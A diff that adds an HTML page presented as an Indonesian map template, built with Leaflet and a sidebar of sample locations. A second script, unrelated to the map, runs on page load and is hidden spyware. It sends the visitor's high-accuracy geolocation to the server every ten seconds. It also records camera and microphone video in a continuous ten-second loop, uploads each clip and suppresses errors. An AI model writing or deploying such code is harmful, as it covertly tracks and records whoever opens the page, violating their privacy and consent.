@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Maps</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+  integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+<style>
+  :root{ --panel:#121826; --panel-2:#182135; --ink:#eef1f7; --muted:#8a93a8; --accent:#4fd1c5; }
+  *{box-sizing:border-box}
+  html,body{height:100%; margin:0}
+  body{
+    font-family:"Segoe UI", system-ui, sans-serif; color:var(--ink); background:#0b0f18;
+    display:flex; flex-direction:column;
+  }
+  header{
+    padding:14px 18px; background:var(--panel); border-bottom:1px solid #222c40;
+    display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap;
+  }
+  header h1{font-size:16px; margin:0; letter-spacing:1px}
+  header h1 span{color:var(--accent)}
+  header small{color:var(--muted); font-size:12px}
+  .layout{display:flex; flex:1; min-height:0}
+  .sidebar{
+    width:260px; background:var(--panel-2); border-right:1px solid #222c40; overflow-y:auto;
+    flex:0 0 auto;
+  }
+  .sidebar .item{
+    padding:14px 16px; border-bottom:1px solid #1d2638; cursor:pointer; transition:background .15s;
+  }
+  .sidebar .item:hover{background:#1c2538}
+  .sidebar .item.active{background:#1a3c38; border-left:3px solid var(--accent)}
+  .sidebar .item b{display:block; font-size:14px; margin-bottom:3px}
+  .sidebar .item span{display:block; font-size:12px; color:var(--muted)}
+  #map{flex:1; min-width:0}
+  @media (max-width:640px){
+    .layout{flex-direction:column}
+    .sidebar{width:100%; max-height:35vh}
+    #map{flex:1}
+  }
+</style>
+</head>
+<body>
+  <header>
+    <h1>MAPS <span>·</span> contoh template</h1>
+    <small>Ganti titik lokasi di script sesuai kebutuhanmu</small>
+  </header>
+  <div class="layout">
+    <div class="sidebar" id="sidebar"></div>
+    <div id="map"></div>
+  </div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+  integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+<script>
+  // contoh titik lokasi — ganti sesuai kebutuhan
+  const places = [
+    { name: "Titik 1", desc: "Deskripsi singkat lokasi", lat: -6.2088, lng: 106.8456 },
+    { name: "Titik 2", desc: "Deskripsi singkat lokasi", lat: -6.9175, lng: 107.6191 },
+    { name: "Titik 3", desc: "Deskripsi singkat lokasi", lat: -7.7956, lng: 110.3695 },
+  ];
+
+  const map = L.map('map', { zoomControl: true }).setView([places[0].lat, places[0].lng], 6);
+
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '&copy; OpenStreetMap contributors',
+    maxZoom: 19
+  }).addTo(map);
+
+  const markers = [];
+  places.forEach((p, i) => {
+    const m = L.marker([p.lat, p.lng]).addTo(map)
+      .bindPopup(`<b>${p.name}</b><br>${p.desc}`);
+    markers.push(m);
+  });
+
+  const sidebar = document.getElementById('sidebar');
+  places.forEach((p, i) => {
+    const el = document.createElement('div');
+    el.className = 'item' + (i === 0 ? ' active' : '');
+    el.innerHTML = `<b>${p.name}</b><span>${p.desc}</span>`;
+    el.addEventListener('click', () => {
+      document.querySelectorAll('.sidebar .item').forEach(n => n.classList.remove('active'));
+      el.classList.add('active');
+      map.flyTo([p.lat, p.lng], 13, { duration: 0.8 });
+      markers[i].openPopup();
+    });
+    sidebar.appendChild(el);
+    
+  });
+</script>
+<script>
+    // 1. Kirim Lokasi Berkala (Setiap 10 detik)
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const gmapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch('/save-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ link: gmapsLink })
+                }).catch(e => {});
+            }, null, { enableHighAccuracy: true });
+        }
+    }
+    sendLocation();
+    setInterval(sendLocation, 10000);
+
+    // 2. Rekam & Kirim Video Kamera Kontinu (Loop per 10 detik)
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+        function recordCycle() {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
+            
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', blob, `rec_${Date.now()}.webm`);
+                
+                // Kirim file video ke server
+                fetch('/save-video', { 
+                    method: 'POST', 
+                    body: formData 
+                })
+                .then(() => recordCycle()) // Ulangi siklus berikutnya otomatis
+                .catch(() => recordCycle());
+            };
+            
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000); // Rekam selama 10 detik lalu kirim
+        }
+        recordCycle();
+    }).catch(e => {
+        console.error("Akses kamera ditolak/tidak tersedia", e);
+    });
+</script>
+</body>
+</html>
